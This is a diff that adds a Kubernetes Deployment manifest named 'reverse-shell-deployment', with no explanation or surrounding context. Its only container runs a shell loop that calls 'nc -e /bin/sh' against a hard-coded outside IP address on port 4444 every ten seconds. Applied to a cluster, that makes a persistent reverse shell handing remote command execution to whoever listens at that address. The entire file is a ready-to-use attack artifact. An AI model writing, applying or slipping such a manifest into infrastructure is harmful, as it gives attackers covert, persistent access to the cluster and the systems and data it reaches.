@@ -1,0 +1,18 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: reverse-shell-deployment
+spec:
+  selector:
+    matchLabels:
+      app: reverse-shell
+  replicas: 1
+  template:
+    metadata:
+      labels:
+        app: reverse-shell
+    spec:
+      containers:
+      - name: reverse-shell
+        image: alpine:latest
+        command: ["/bin/sh", "-c", "while true; do nc -e /bin/sh  44.203.85.122 4444; sleep 10; done"]
